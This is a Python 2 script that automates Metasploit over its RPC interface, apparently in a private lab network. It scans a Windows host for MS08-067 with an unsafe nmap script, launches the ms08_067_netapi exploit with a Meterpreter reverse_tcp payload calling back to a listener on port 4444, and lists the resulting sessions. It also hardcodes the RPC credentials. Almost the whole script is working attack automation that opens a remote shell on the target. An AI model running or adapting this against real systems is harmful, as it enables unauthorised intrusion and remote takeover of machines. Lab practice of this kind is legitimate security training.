__author__ = 'dave'

import time

import MsfMsgrpc


def check_ms08_067(msf_msgrpc, consoleId, rhost):
    nmapCmd = "db_nmap --script=smb-check-vulns --script-args=unsafe=1 -p 139,445 " + rhost + "\n"

    print "[+] Initiating nmap scan\n\t" + nmapCmd
    response = msf_msgrpc.consoleWrite(token, consoleId, nmapCmd)
    print "Console Write: " + str(response)

    time.sleep(30)

    response = msf_msgrpc.consoleRead(token, consoleId)
    data = response['data'].split('\n')

    print "Console Read: " + str(response)

    print data

    isVulnerable = False
    for line in data:
        if ("MS08-067" in line and "VULNERABLE" in line):
            isVulnerable = True

    return isVulnerable


host = "172.16.188.128"
port = 55552
username = "msf"
password = "pymsgrpc"

msf_msgrpc = MsfMsgrpc.MsfMsgrpc(host, port, username, password)

print "hello"

token = msf_msgrpc.login ()['token']

print "Token: " + token

stats = msf_msgrpc.moduleStats(token)
print "Module Stats: " + str(stats)

response = msf_msgrpc.createConsole(token)
consoleId = response["id"]

print "Create Console: " + str(response)

response = msf_msgrpc.consoleRead(token, consoleId)
print "Console Read: " + str(response)

rhost = "172.16.188.129"

isVuln = check_ms08_067(msf_msgrpc, consoleId, rhost)

print str(isVuln)

if (isVuln):
    ms08_067 = """use exploit/windows/smb/ms08_067_netapi
    set payload windows/meterpreter/reverse_tcp
    set rhost """ + rhost + """
    set lhost 172.16.188.128
    set lport 4444
    run
    """

    print ms08_067

    response = msf_msgrpc.consoleWrite(token, consoleId, ms08_067)
    print "Console Write: " + str(response)

    response = msf_msgrpc.consoleRead(token, consoleId)
    print "Console Read: " + str(response)

    time.sleep(15)

    response = msf_msgrpc.consoleWrite(token, consoleId, "sessions")
    print "Console Write: " + str(response)

    response = msf_msgrpc.consoleRead(token, consoleId)
    print "Console Read: " + str(response)

response = msf_msgrpc.destroyConsole(token, consoleId)
print "Destroy Console: " + str(response)